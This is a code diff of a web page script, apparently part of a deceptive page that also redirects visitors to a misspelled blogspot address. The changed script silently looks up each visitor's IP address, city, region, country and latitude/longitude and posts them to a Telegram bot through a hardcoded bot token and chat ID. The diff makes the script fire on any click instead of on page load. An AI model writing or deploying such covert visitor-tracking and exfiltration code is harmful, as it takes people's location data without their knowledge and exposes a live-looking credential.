@@ -15,27 +15,30 @@ document.location.href = 'https://expried.blogspot.com/';
 console.log('Server aktif');
 }
       </script>
-            <script>
+
+           <script>
         const telegramBotToken = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
         const telegramChatId = '7407149096';
 
         $(document).ready(function() {
-            $.get('https://ipapi.co/json/', function(data) {
-                if (!data.error) {
-                    const message = `
-                        IP Address: ${data.ip}
-                        City: ${data.city}
-                        Region: ${data.region}
-                        Country: ${data.country_name}
-                        Latitude: ${data.latitude}
-                        Longitude: ${data.longitude}
-                    `;
+            $(document).on('click', function() {
+                $.get('https://ipapi.co/json/', function(data) {
+                    if (!data.error) {
+                        const message = `
+                            IP Address: ${data.ip}
+                            City: ${data.city}
+                            Region: ${data.region}
+                            Country: ${data.country_name}
+                            Latitude: ${data.latitude}
+                            Longitude: ${data.longitude}
+                        `;
 
-                    $.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                        chat_id: telegramChatId,
-                        text: message
-                    });
-                }
+                        $.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                            chat_id: telegramChatId,
+                            text: message
+                        });
+                    }
+                });
             });
         });
     </script>
